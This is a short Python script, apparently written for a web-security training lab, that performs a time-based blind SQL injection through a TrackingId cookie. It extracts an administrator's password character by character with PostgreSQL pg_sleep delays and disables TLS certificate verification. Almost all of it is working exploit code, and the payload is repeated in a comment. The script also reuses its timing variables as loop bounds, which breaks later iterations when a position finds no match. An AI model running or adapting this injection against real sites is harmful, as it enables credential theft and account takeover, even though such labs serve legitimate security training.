import requests
import string
import time
from urllib3.exceptions import InsecureRequestWarning

# Ignore SSL warnings(
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# List of alphabet [a-z,A-Z,1-9]
alphabet = ''.join([string.ascii_letters,string.digits])

url = "https://<host>/filter?category=Gifts"

# Alphabet delimiter
start = 0
end = len(alphabet)
# Get the password of administrator
flag = []

# ' || (case when SUBSTRING((select username from users where username='administrator'),1,1)='b' then pg_sleep(0.1) else pg_sleep(2) end)-- -;
for index in range(1,30):
	for i in range(start,end):
		cookies = {"TrackingId":f"qbCUyXsllzlf2YnJ'+||+(case+when+SUBSTRING((select+password+from+users+where+username%3d'administrator'),{index},1)%3d'{alphabet[i]}'+then+pg_sleep(0.1)+else+pg_sleep(1)+end)--+-; session=aa"}
		start = time.time()
		r = requests.get(url,cookies=cookies,verify=False)
		end = time.time()
		if int(end-start) <= 0:
			flag.append(alphabet[i])
			print("Flag is :",''.join(flag))
			start = 0
			end = len(alphabet)
			break
		else:
			print(alphabet[i])
